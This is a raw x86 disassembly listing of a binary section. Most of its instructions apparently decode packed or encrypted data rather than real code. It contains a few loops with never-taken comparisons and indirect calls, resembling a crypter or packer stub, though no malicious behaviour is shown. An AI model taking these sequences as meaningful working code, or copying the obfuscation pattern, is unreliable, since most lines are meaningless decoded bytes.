  41290b:	adc    esp,ebx
  41290d:	(bad)  
  41290e:	and    esp,DWORD PTR [edi-0x1e140101]
  412914:	jmp    0xcffe:0x8d4bf18a
  41291b:	pop    ebx
  41291c:	sub    eax,0x812883ab
  412921:	xchg   ecx,eax
  412922:	nop
  412923:	jo     0x4128de
  412925:	xor    BYTE PTR [ebp+0x5ca782de],dl
  41292b:	add    cl,BYTE PTR [ebp+0x64]
  41292e:	dec    ebx
  41292f:	mov    ds:0xca0a2c14,al
  412934:	mov    esi,0x39b0b1e6
  412939:	xor    edx,edi
  41293b:	nop
  41293c:	ins    BYTE PTR es:[edi],dx
  41293d:	xor    BYTE PTR [edx-0x66],ah
  412940:	into   
  412941:	xchg   edx,eax
  412942:	sti    
  412943:	mov    al,0x46
  412945:	xor    DWORD PTR [edx+0x1a],edx
  412948:	or     al,0xaa
  41294a:	jnp    0x41295e
  41294c:	les    eax,FWORD PTR [ecx-0x476f2588]
  412952:	mov    ecx,0xc75b2d6a
  412957:	jecxz  0x4129d8
  412959:	add    bh,dh
  41295b:	mov    esp,0x1eeb1e91
  412960:	js     0x412909
  412962:	and    DWORD PTR [edx+0x7e],edx
  412965:	test   al,0x1e
  412967:	push   ebp
  412968:	push   cs
  412969:	mov    fs,WORD PTR [ebx]
  41296b:	pop    ebx
  41296c:	cld    
  41296d:	or     al,BYTE PTR es:[edx-0x37]
  412971:	ins    BYTE PTR es:[edi],dx
  412972:	xor    ebx,DWORD PTR [eax+0x70]
  412975:	sub    bh,al
  412977:	jmp    0xc9b9:0xfb05edd6
  41297e:	hlt    
  41297f:	mov    al,0x2d
  412981:	sbb    al,0xe0
  412983:	inc    edi
  412984:	ss jl  0x4129f7
  412987:	jp     0x4129b7
  412989:	mov    esp,0x85a0346e
  41298e:	sbb    al,0x74
  412990:	push   esp
  412991:	(bad)  
  412992:	js     0x4129c8
  412994:	aaa    
  412995:	cwde   
  412996:	mov    cl,0xd4
  412998:	inc    esp
  412999:	xor    eax,0x78125549
  41299e:	mov    ds:0x4d0bc016,al
  4129a3:	and    eax,0xd189935e
  4129a8:	xor    DWORD PTR [ebx],edi
  4129aa:	dec    esp
  4129ab:	rcl    BYTE PTR [edx+eax*1-0x4b],0xcd
  4129b0:	div    BYTE PTR [esi+0x2f8ffa86]
  4129b6:	jp     0x4129ae
  4129b8:	cld    
  4129b9:	mov    esp,0xab823269
  4129be:	(bad)  
  4129bf:	mov    dl,0x31
  4129c1:	sbb    al,0x7
  4129c3:	shl    ebx,cl
  4129c5:	add    eax,0x4f08971e
  4129ca:	call   0x54eb:0x5f81a605
  4129d1:	dec    esp
  4129d2:	xchg   BYTE PTR [ecx-0x5590e746],dl
  4129d8:	lahf   
  4129d9:	shl    DWORD PTR [edx-0x71],1
  4129dc:	pop    es
  4129dd:	mov    WORD PTR [eax+0x19],ds
  4129e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129e1:	repnz into 
  4129e3:	test   eax,0x8994f06d
  4129e9:	bndldx bnd1,[eax+ebp*8-0x1a756f9f]
  4129f1:	pop    esp
  4129f2:	xchg   ebp,eax
  4129f3:	push   0xffffff8c
  4129f5:	pop    es
  4129f6:	iret   
  4129f7:	or     DWORD PTR [edi+ebx*1+0x46],ebx
  4129fb:	mov    ebp,0xeb8c51be
  412a00:	sub    al,BYTE PTR [edx+0x1d]
  412a03:	add    al,0xb7
  412a05:	push   es
  412a06:	test   eax,0xf6f43fe6
  412a0b:	dec    edi
  412a0c:	jae    0x4129fe
  412a0e:	hlt    
  412a0f:	mov    cl,0x3a
  412a11:	pop    ecx
  412a12:	add    eax,0x775718c
  412a17:	ins    DWORD PTR es:[edi],dx
  412a18:	mov    ch,0xd6
  412a1a:	cld    
  412a1b:	out    0x8b,al
  412a1d:	xchg   DWORD PTR [edi-0x774a3bc1],edx
  412a23:	ds inc esi
  412a25:	inc    ebp
  412a26:	ds add esp,esp
  412a29:	mov    dl,0xda
  412a2b:	repnz repz mov ah,0xf
  412a2f:	aad    0xe5
  412a31:	adc    ah,BYTE PTR ss:[ecx-0x59ab30b4]
  412a38:	pushf  
  412a39:	loop   0x4129c4
  412a3b:	das    
  412a3c:	xchg   ebx,eax
  412a3d:	jbe    0x4129dd
  412a3f:	sar    BYTE PTR [esi-0x4eb0824],cl
  412a45:	pop    gs
  412a47:	inc    eax
  412a48:	int3   
  412a49:	aaa    
  412a4a:	rep stos DWORD PTR es:[edi],eax
  412a4c:	push   0x1
  412a4e:	ins    DWORD PTR es:[edi],dx
  412a4f:	pusha  
  412a50:	sar    BYTE PTR gs:[ebx],cl
  412a53:	push   0xfffffff5
  412a55:	mov    edx,0xbd01d8dd
  412a5a:	mov    al,ds:0xc6b33208
  412a5f:	addr16 mov cl,0x54
  412a62:	sub    BYTE PTR [esi+0x5b82fc3e],bl
  412a68:	push   ecx
  412a69:	sbb    DWORD PTR [edi],0x737199de
  412a6f:	sbb    bh,ah
  412a71:	pop    eax
  412a72:	mov    edi,0x29caf824
  412a77:	outs   dx,DWORD PTR fs:[esi]
  412a79:	mov    esp,0xc20633c0
  412a7e:	jg     0x412ad8
  412a80:	sti    
  412a81:	or     eax,0x6c5ca413
  412a86:	aas    
  412a87:	push   esp
  412a88:	test   al,0xc2
  412a8a:	inc    esi
  412a8b:	out    dx,eax
  412a8c:	add    BYTE PTR [esi+0x76],al
  412a8f:	push   0x10840f
  412a94:	add    BYTE PTR [eax],al
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b74
  412b3b:	mov    ah,cl
  412b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b99
  412b47:	jmp    0x412b6f
  412b49:	in     eax,0x4f
  412b4b:	loope  0x412b28
  412b4d:	mov    edi,ecx
  412b4f:	sbb    al,ah
  412b51:	and    al,0xc1
  412b53:	pop    ebx
  412b54:	mov    esi,0xd831b934
  412b59:	sub    eax,0x2ee0360f
  412b5e:	mov    bl,0x34
  412b60:	aaa    
  412b61:	pop    ebp
  412b62:	mov    esi,ebx
  412b64:	out    dx,al
  412b65:	jle    0x412b91
  412b67:	push   eax
  412b68:	mov    esp,0xabe10b36
  412b6d:	inc    ebp
  412b6e:	div    BYTE PTR [edi+0x621d0620]
  412b74:	adc    ah,BYTE PTR [ebx-0x3f3a3015]
  412b7a:	bound  eax,QWORD PTR [esi-0x61]
  412b7d:	mov    cl,0x41
  412b7f:	or     cl,bl
  412b81:	daa    
  412b82:	mov    bh,0x62
  412b84:	xchg   edi,eax
  412b85:	inc    edx
  412b86:	nop
  412b87:	jge    0x412b41
  412b89:	push   esp
  412b8a:	aad    0xe8
  412b8c:	inc    edx
  412b8d:	xchg   ebx,eax
  412b8e:	mov    al,al
  412b90:	cdq    
  412b91:	sub    BYTE PTR [edx-0x4c],dh
  412b94:	adc    DWORD PTR [eax-0x23aea491],edx
  412b9a:	in     al,0xba
  412b9c:	xor    bl,BYTE PTR [eax+0x42e52d22]
  412ba2:	ficom  WORD PTR [edi]
  412ba4:	test   al,0x95
  412ba6:	push   ds
  412ba7:	lods   al,BYTE PTR ds:[esi]
  412ba8:	stos   DWORD PTR es:[edi],eax
  412ba9:	nop
  412baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bab:	add    DWORD PTR [edi+esi*2-0x257267b6],ebx
  412bb2:	pushf  
  412bb3:	(bad)  
  412bb4:	cld    
  412bb5:	xchg   edi,eax
  412bb6:	aas    
  412bb7:	xchg   edi,eax
  412bb8:	sub    DWORD PTR [ecx],esi
  412bba:	imul   eax,DWORD PTR [eiz*2+0x61f228de],0x7be8c25
  412bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc6:	mov    ds:0xf74146b5,al
  412bcb:	clc    
  412bcc:	mov    eax,fs:0x5fbf3346
  412bd2:	push   ebp
  412bd3:	(bad)  
  412bd4:	xor    BYTE PTR [esi],ch
  412bd6:	inc    eax
  412bd7:	xchg   esp,eax
  412bd8:	(bad)  
  412bd9:	iret   
  412bda:	ins    DWORD PTR es:[edi],dx
  412bdb:	pop    eax
  412bdc:	and    al,0xbc
  412bde:	jae    0x412c3a
  412be0:	xor    al,0x91
  412be2:	cli    
  412be3:	jecxz  0x412b97
  412be5:	adc    dh,BYTE PTR [esi+eiz*4]
  412be8:	sub    al,BYTE PTR [edx]
  412bea:	xchg   ebx,eax
  412beb:	(bad)  
  412bec:	xor    al,0x9
  412bee:	test   eax,0xff51b025
  412bf3:	out    0x19,eax
  412bf5:	call   0x881e247e
  412bfa:	mov    ebp,DWORD PTR [ecx-0x32]
  412bfd:	jno    0x412bf5
  412bff:	mov    al,ds:0x506db530
  412c04:	sub    esi,eax
  412c06:	loop   0x412b9a
  412c08:	sbb    DWORD PTR [eax-0x21e4e265],eax
  412c0e:	jmp    0x412c86
  412c10:	mov    edx,0x4a8c83e3
  412c15:	cmp    esi,ebx
  412c17:	mov    dl,0xf7
  412c19:	push   ss
  412c1a:	add    cl,cl
  412c1c:	stos   DWORD PTR es:[edi],eax
  412c1d:	add    eax,0x61b678f8
  412c22:	cmp    ecx,DWORD PTR [edi]
  412c24:	add    DWORD PTR [esi+0x1995cc5d],ebx
  412c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c2b:	into   
  412c2c:	fcom   QWORD PTR [eax-0x4e]
  412c2f:	aaa    
  412c30:	xor    DWORD PTR [edx+0x9],esi
  412c33:	pop    esi
  412c34:	pushf  
  412c35:	fistp  WORD PTR [esi]
  412c37:	jle    0x412be8
  412c39:	mov    cl,BYTE PTR [ebx-0xc2b6fe9]
  412c3f:	sbb    DWORD PTR [esp+esi*4],esp
  412c42:	test   eax,0x2feaa871
  412c47:	dec    ebp
  412c48:	popa   
  412c49:	pop    ebp
  412c4a:	mov    ebp,0x6befbdd3
  412c4f:	and    DWORD PTR [edx],0x4f99baf5
  412c55:	inc    edi
  412c56:	mov    ds:0x661a592b,al
  412c5b:	jb     0x412c04
  412c5d:	or     eax,0x81dc9d37
  412c62:	fcomip st,st(1)
  412c64:	test   BYTE PTR [eax-0x5fa52007],dl
  412c6a:	mov    ebx,0x35fc1ff6
  412c6f:	sbb    eax,0xf1fbb53e
  412c74:	or     ch,BYTE PTR [edx-0x56]
  412c77:	test   BYTE PTR [eax],bh
  412c79:	jmp    0x412cdc
  412c7b:	xor    dl,BYTE PTR [ecx-0x5a76effd]
  412c81:	inc    ebx
  412c82:	push   edi
  412c83:	and    cl,ch
  412c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c86:	sbb    BYTE PTR [edx-0x7bbaf676],ch
  412c8c:	ds push esp
  412c8e:	test   DWORD PTR [ecx-0x35d94140],ebp
  412c94:	pop    ebp
  412c95:	dec    edi
  412c96:	stos   DWORD PTR es:[edi],eax
  412c97:	ins    BYTE PTR es:[edi],dx
  412c98:	mov    ecx,ds
  412c9a:	sbb    DWORD PTR [eax+0x6d6e320],0x795987b2
  412ca4:	aas    
  412ca5:	out    0x3e,eax
  412ca7:	in     al,dx
  412ca8:	or     DWORD PTR [ecx+0x408cab0],edi
  412cae:	push   0x18575bfe
  412cb3:	ret    0xad8b
  412cb6:	ja     0x412ce1
  412cb8:	sbb    eax,eax
  412cba:	shl    ebx,cl
  412cbc:	repnz out 0xb1,eax
  412cbf:	xchg   edx,eax
  412cc0:	pop    ds
  412cc1:	test   BYTE PTR [edx],al
  412cc3:	repnz add esi,edi
  412cc6:	in     eax,dx
  412cc7:	sub    eax,0xbe0d6223
  412ccc:	out    dx,al
  412ccd:	pop    ss
  412cce:	hlt    
  412ccf:	cwde   
  412cd0:	(bad)  
  412cd1:	xor    al,0x16
  412cd3:	lea    eax,[edi+eax*4]
  412cd6:	add    eax,0x36c447e8
  412cdb:	test   al,0xa8
  412cdd:	outs   dx,DWORD PTR ds:[esi]
  412cde:	push   edi
  412cdf:	add    al,0xa4
  412ce1:	cmp    dh,bl
  412ce3:	jmp    0x80b0ea30
  412ce8:	pop    esp
  412ce9:	push   ebp
  412cea:	enter  0xafe7,0xaf
  412cee:	ds sti 
  412cf0:	leave  
  412cf1:	jge    0x412ce5
  412cf3:	jmp    0xfef1:0xb1265f0c
  412cfa:	push   ds
  412cfb:	repz enter 0x30c0,0xb4
  412d00:	mov    eax,0x598ec4f6
  412d05:	test   eax,0xcd007824
  412d0a:	jge    0x412cce
  412d0c:	mov    ds:0x61745f1d,eax
  412d11:	mov    ah,0xca
  412d13:	dec    edx
  412d14:	xchg   edx,eax
  412d15:	in     al,0x2b
  412d17:	mov    ebx,0xba49b575
  412d1c:	xchg   ebx,eax
  412d1d:	cld    
  412d1e:	pop    eax
  412d1f:	in     al,0xb2
  412d21:	inc    edi
  412d22:	or     DWORD PTR [edx+0x22549135],0x40af7fec
  412d2c:	pop    edx
  412d2d:	and    ebp,eax
  412d2f:	dec    ecx
  412d30:	add    DWORD PTR [eax],0x4152f82
  412d36:	sub    eax,0x6cf3a550
  412d3b:	adc    eax,0x342448a8
  412d40:	jo     0x412d25
  412d42:	xchg   esp,eax
  412d43:	repnz sbb BYTE PTR [eax],bl
  412d46:	jmp    0x6fb1:0x5f518ca4
  412d4d:	es pushf 
  412d4f:	cmp    bh,BYTE PTR [eax+ecx*1]
  412d52:	imul   edx,DWORD PTR [esi+eiz*1],0x79
  412d56:	sub    BYTE PTR [ebx-0x51ac43f7],bl
  412d5c:	xchg   dl,ch
  412d5e:	outs   dx,DWORD PTR ds:[esi]
  412d5f:	imul   ebp,esi,0x69c25c7c
  412d65:	add    esi,DWORD PTR [edx-0x21]
  412d68:	pusha  
  412d69:	div    DWORD PTR [edx]
  412d6b:	adc    eax,0x5f591cb5
  412d70:	dec    esp
  412d71:	dec    ebx
  412d72:	in     al,dx
  412d73:	or     dl,BYTE PTR [edi+0x53b86947]
  412d79:	fs cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  412d7c:	int    0x56
  412d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d7f:	stos   BYTE PTR es:[edi],al
  412d80:	pop    edi
  412d81:	mov    bl,0x59
  412d83:	ins    DWORD PTR es:[edi],dx
  412d84:	dec    ebp
  412d85:	mov    dh,0x29
  412d87:	daa    
  412d88:	cmp    al,0x75
  412d8a:	jb     0x412d6d
  412d8c:	out    0x38,al
  412d8e:	sub    eax,0x69169d11
  412d93:	std    
  412d94:	inc    ecx
  412d95:	sub    bh,bl
  412d97:	adc    al,0x98
  412d99:	pusha  
  412d9a:	mov    edx,0x71c0438c
  412d9f:	xor    DWORD PTR [ecx],edi
  412da1:	into   
  412da2:	mov    edx,0x919ff271
  412da7:	or     ebx,DWORD PTR [edi+0x5a]
  412daa:	int3   
  412dab:	xor    edi,ebp
  412dad:	inc    edi
  412dae:	jmp    0x7acbd502
  412db3:	ins    DWORD PTR es:[edi],dx
  412db4:	xor    eax,0xbb357894
  412db9:	mov    esi,0xa50f2930
  412dbe:	jbe    0x412d5a
  412dc0:	pop    es
  412dc1:	aas    
  412dc2:	out    0xe3,al
  412dc4:	in     al,0x30
  412dc6:	rol    DWORD PTR [esi],0xcc
  412dc9:	icebp  
  412dca:	jae    0x412d94
  412dcc:	mov    bl,BYTE PTR [eax]
  412dce:	ds mov eax,0x43ced540
  412dd4:	icebp  
  412dd5:	(bad)  
  412dd7:	jb     0x412da7
  412dd9:	xor    ebx,edx
  412ddb:	jb     0x412e4d
  412ddd:	pop    eax
  412dde:	jmp    0x6e42aacd
  412de3:	sar    DWORD PTR [esi-0x7ab0d0fe],cl
  412de9:	mov    eax,ds:0x9c74ed2
  412dee:	mov    WORD PTR [ecx],?
  412df0:	shr    eax,1
  412df2:	push   0x1
  412df4:	addr16 push es
  412df6:	loopne 0x412d7c
  412df8:	daa    
  412df9:	repnz pop edx
  412dfb:	sti    
  412dfc:	adc    edx,edi
  412dfe:	and    eax,0x3b371598
  412e03:	xlat   BYTE PTR ds:[ebx]
  412e04:	lods   al,BYTE PTR ds:[esi]
  412e05:	test   BYTE PTR [ecx+0x33e2a586],bh
  412e0b:	lods   eax,DWORD PTR ds:[esi]
  412e0c:	jnp    0x412d95
  412e0e:	into   
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [edi+0x5a77bbf0],sp
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x4c70707e
  412e82:	mov    al,0x2
  412e84:	jmp    0x3c3b:0x2dba3ba6
  412e8b:	ds fdivr st,st(0)
  412e8e:	loopne 0x412ed4
  412e90:	cdq    
  412e91:	mov    eax,ds:0x2f3f4b7b
  412e96:	jo     0x412f0e
  412e98:	ss and al,0x1b
  412e9b:	or     al,0xa5
  412e9d:	jle    0x412f14
  412e9f:	outs   dx,BYTE PTR ds:[esi]
  412ea0:	cmp    al,0x63
  412ea2:	pop    ebp
  412ea3:	popf   
  412ea4:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  412ea6:	lds    edx,FWORD PTR [ebx+0x6b]
  412ea9:	test   BYTE PTR [ecx-0x71cc314a],bh
  412eaf:	jl     0x412ea4
  412eb1:	pop    esp
  412eb2:	std    
  412eb3:	cmp    dh,al
  412eb5:	inc    ecx
  412eb6:	xlat   BYTE PTR ds:[ebx]
  412eb7:	stos   DWORD PTR es:[edi],eax
  412eb8:	cs idiv dh
  412ebb:	in     al,dx
  412ebc:	arpl   WORD PTR [ecx+0x63ade322],ax
  412ec2:	lods   eax,DWORD PTR ds:[esi]
  412ec3:	bound  esp,QWORD PTR [edi-0x2b6d7d35]
  412ec9:	jae    0x412e70
  412ecb:	mov    al,ds:0x377c0960
  412ed0:	sub    eax,0x31ed637b
  412ed5:	inc    ebp
  412ed6:	dec    esp
  412ed7:	jno    0x412e71
  412ed9:	push   cs
  412eda:	jl     0x412f2d
  412edc:	in     eax,0x1e
  412ede:	dec    ecx
  412edf:	mov    ch,0xc
  412ee1:	repnz pop edx
  412ee3:	(bad)
  412ee6:	pop    edi
  412ee7:	and    ah,BYTE PTR [ecx-0x156c1026]
  412eed:	xchg   DWORD PTR [ebp+edx*4+0x67],eax
  412ef1:	je     0x412e94
  412ef3:	mov    ebp,0xf8f9eff1
  412ef8:	ret    
  412ef9:	repnz outs dx,BYTE PTR ds:[esi]
  412efb:	(bad)  
  412efc:	imul   edx,DWORD PTR [edi+0x25],0x14
  412f00:	sub    al,0xb7
  412f02:	outs   dx,DWORD PTR ds:[esi]
  412f03:	push   cs
  412f04:	adc    ebp,DWORD PTR [esp+ebp*8]
  412f07:	fadd   DWORD PTR [edx+ebp*8+0x6429b102]
  412f0e:	pop    eax
  412f0f:	(bad)  
  412f10:	mov    bl,0x94
  412f12:	xor    edx,edi
  412f14:	std    
  412f15:	bound  edx,QWORD PTR [ebx+0x4f2e745f]
  412f1b:	mov    eax,DWORD PTR ds:0xcd7bed24
  412f21:	(bad)  
  412f22:	dec    eax
  412f23:	add    eax,0x2e77b1bf
  412f28:	xchg   edi,eax
  412f29:	xchg   esi,eax
  412f2a:	test   eax,0x1de54735
  412f2f:	cwde   
  412f30:	lea    ebp,[ebx-0x3af47915]
  412f36:	into   
  412f37:	dec    ecx
  412f38:	lea    ebx,[ecx]
  412f3a:	adc    esi,edx
  412f3c:	pop    eax
  412f3d:	pop    ebx
  412f3e:	pop    edi
  412f3f:	ss dec edi
  412f41:	fld    TBYTE PTR [ecx-0x68af83a4]
  412f47:	jb     0x412f6b
  412f49:	mov    dh,0x9c
  412f4b:	jns    0x412f97
  412f4d:	(bad)  
  412f4e:	bound  edx,QWORD PTR [edi-0x7e]
  412f51:	push   0x7c
  412f53:	repz retf 
  412f55:	std    
  412f56:	inc    edi
  412f57:	mov    cl,0x4b
  412f59:	pusha  
  412f5a:	ja     0x412f97
  412f5c:	xchg   ebx,eax
  412f5d:	daa    
  412f5e:	loopne 0x412ee7
  412f60:	fwait
  412f61:	(bad)  
  412f62:	ins    DWORD PTR es:[edi],dx
  412f63:	xor    al,0xeb
  412f65:	mov    edx,0xcd16d3ff
  412f6a:	std    
  412f6b:	(bad)  
  412f6d:	pop    ebx
  412f6e:	(bad)  
  412f6f:	mov    ch,0xa4
  412f71:	test   eax,0xd1ccb8f1
  412f76:	mov    bh,0xcd
  412f78:	js     0x412f8e
  412f7a:	popa   
  412f7b:	mov    bl,0xb0
  412f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f7e:	in     eax,0x68
  412f80:	daa    
  412f81:	cwde   
  412f82:	xor    ah,al
  412f84:	int    0x9f
  412f86:	sbb    DWORD PTR [ebx-0x6657bcdc],edx
  412f8c:	dec    edi
  412f8d:	fisub  WORD PTR [esp+ecx*4-0x47de4f72]
  412f94:	ins    DWORD PTR es:[edi],dx
  412f95:	pop    edi
  412f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f97:	js     0x412f96
  412f99:	pop    ss
  412f9a:	jmp    0x413006
  412f9c:	test   al,0xf9
  412f9e:	push   esp
  412f9f:	jns    0x412f73
  412fa1:	pushf  
  412fa2:	in     eax,0x40
  412fa4:	xor    al,0x9d
  412fa6:	mov    esi,0x88e40cd3
  412fab:	lods   al,BYTE PTR ds:[esi]
  412fac:	xchg   ecx,eax
  412fad:	js     0x41300a
  412faf:	add    BYTE PTR [ecx],bl
  412fb1:	push   ds
  412fb2:	cmp    cl,BYTE PTR [eax+0x11e69f2f]
  412fb8:	mul    ebp
  412fba:	out    0x22,al
  412fbc:	lea    edx,[eax-0x524a6f66]
  412fc2:	mov    eax,0xeb6816d6
  412fc7:	cmp    al,0x18
  412fc9:	(bad)  
  412fca:	jo     0x412ff7
  412fcc:	sub    al,0xd6
  412fce:	add    ah,BYTE PTR [eax+0x55067c46]
  412fd4:	popa   
  412fd5:	ss ret 0x94b6
  412fd9:	xchg   ebx,eax
  412fda:	xor    al,0xdc
  412fdc:	test   eax,0xde635d89
  412fe1:	test   al,0x5e
  412fe3:	xor    BYTE PTR [eax-0x1c],al
  412fe6:	and    eax,0xc061128b
  412feb:	inc    ebx
  412fec:	push   edi
  412fed:	aas    
  412fee:	in     eax,dx
  412fef:	scas   eax,DWORD PTR es:[edi]
  412ff0:	cmp    DWORD PTR ds:0xb553f2f6,ebp
  412ff6:	adc    al,0xdd
  412ff8:	dec    edx
  412ff9:	sub    al,0x11
  412ffb:	lahf   
  412ffc:	in     eax,dx
  412ffd:	cli    
  412ffe:	pop    ebx
  412fff:	push   cs
  413000:	mov    al,ds:0x3d94fe1b
  413005:	(bad)
  413008:	test   ch,ch
  41300a:	xor    BYTE PTR [ebx+0x77],dl
  41300d:	jecxz  0x413045
  41300f:	mov    bl,0x9e
  413011:	ret    0x9210
  413014:	mov    ds:0x53d39db5,eax
  413019:	jmp    0x41300a
  41301b:	iret   
  41301c:	mov    ch,BYTE PTR [ecx]
  41301e:	lods   al,BYTE PTR ds:[esi]
  41301f:	and    edi,DWORD PTR [ecx-0x24f14a4c]
  413025:	out    0xa6,al
  413027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413028:	adc    BYTE PTR [ecx-0x2cd264f5],al
  41302e:	pop    ebp
  41302f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413030:	pop    ss
  413031:	pop    ebp
  413032:	loop   0x413049
  413034:	adc    al,0x88
  413036:	push   0x36
  413038:	adc    edi,DWORD PTR [ecx-0x43]
  41303b:	adc    cl,BYTE PTR [edx]
  41303d:	aaa    
  41303e:	mov    eax,ds:0xbc5246ff
  413043:	retf   
  413044:	ins    DWORD PTR es:[edi],dx
  413045:	jne    0x413057
  413047:	jb     0x4130a5
  413049:	cs std 
  41304b:	cs dec esi
  41304d:	cli    
  41304e:	dec    ebp
  41304f:	shl    DWORD PTR [ebx-0x6953b92d],0x64
  413056:	pop    ebp
  413057:	cli    
  413058:	xchg   ebp,eax
  413059:	adc    eax,0x9b500b65
  41305e:	cmp    eax,0x6798514d
  413063:	inc    eax
  413064:	fs push cs
  413066:	inc    edx
  413067:	call   0x95e9013b
  41306c:	rol    DWORD PTR ds:[edi-0x2a],0x8c
  413071:	jp     0x412ff5
  413073:	jl     0x41301f
  413075:	(bad)  
  413076:	fstp   TBYTE PTR [ecx]
  413078:	mov    es,edx
  41307a:	hlt    
  41307b:	gs lahf 
  41307d:	mov    bh,0x60
  41307f:	shl    DWORD PTR [edi+ebp*1+0x66],0xa6
  413084:	mov    edx,0x7706b1d1
  413089:	xor    BYTE PTR [eax+0x7f9290f6],dh
  41308f:	and    eax,0xe42e35d2
  413094:	xchg   esp,eax
  413095:	ins    BYTE PTR es:[edi],dx
  413096:	std    
  413097:	std    
  413098:	fwait
  413099:	stos   DWORD PTR es:[edi],eax
  41309a:	fbstp  TBYTE PTR ds:0xd3cd0978
  4130a0:	call   0x13fb:0xa8fc0317
  4130a7:	fsub   DWORD PTR [edi]
  4130a9:	(bad)  
  4130aa:	pop    ds
  4130ab:	(bad)  
  4130ac:	jg     0x41303a
  4130ae:	adc    BYTE PTR [edx],dl
  4130b0:	fs popf 
  4130b2:	adc    edi,DWORD PTR [ebx+0x50091bf6]
  4130b8:	pop    ebp
  4130b9:	xor    ch,al
  4130bb:	nop
  4130bc:	(bad)  
  4130bd:	pop    ebx
  4130be:	mov    ecx,edx
  4130c0:	lds    ecx,FWORD PTR [ebx]
  4130c2:	retf   
  4130c3:	cmc    
  4130c4:	(bad)  
  4130c5:	and    cl,dh
  4130c7:	inc    ebp
  4130c8:	xchg   DWORD PTR [eax],ebp
  4130ca:	nop
  4130cb:	adc    DWORD PTR [esi-0x52],0xa56d0012
  4130d2:	bound  esi,QWORD PTR [ebp-0xd]
  4130d5:	(bad)  
  4130d6:	(bad)  
  4130d8:	btc    edx,ebp
  4130db:	pop    ecx
  4130dc:	ror    esi,1
  4130de:	ss dec ebp
  4130e0:	add    al,0xf7
  4130e2:	cmp    BYTE PTR [ebx+ebp*2],dl
  4130e5:	std    
  4130e6:	inc    ebx
  4130e7:	pop    es
  4130e8:	jne    0x41313b
  4130ea:	lock dec ebx
  4130ec:	outs   dx,DWORD PTR ds:[esi]
  4130ed:	add    BYTE PTR [esi-0x591831d3],bl
  4130f3:	lods   al,BYTE PTR ds:[esi]
  4130f4:	xor    bl,BYTE PTR [ecx+eax*2]
  4130f7:	lea    esp,[ebx-0x7600a732]
  4130fd:	cwde   
  4130fe:	(bad)  ds:0x16de7886
  413104:	jne    0x413119
  413106:	cmc    
  413107:	fnstenv [ebx]
  413109:	inc    ebx
  41310a:	in     eax,0xc4
  41310c:	ret    0x30f1
  41310f:	mov    ss,WORD PTR [edi]
  413111:	push   0x2e
  413113:	sub    ebp,DWORD PTR [eax+0x3]
  413116:	xor    dl,BYTE PTR [edx+0x1b]
  413119:	jns    0x41315d
  41311b:	cmp    eax,0x7ade4444
  413120:	push   fs
  413122:	cld    
  413123:	xchg   ebp,eax
  413124:	es mov cl,bl
  413127:	push   ebx
  413128:	cmp    al,0x66
  41312a:	jmp    0xa42ea33e
  41312f:	mov    esp,0x114e4a67
  413134:	jg     0x413125
  413136:	adc    eax,0x8987d77d
  41313b:	push   0x15
  41313d:	loop   0x4130f9
  41313f:	fistp  QWORD PTR [eax]
  413141:	sbb    al,al
  413143:	cmp    BYTE PTR [ebx-0x7665694f],0x75
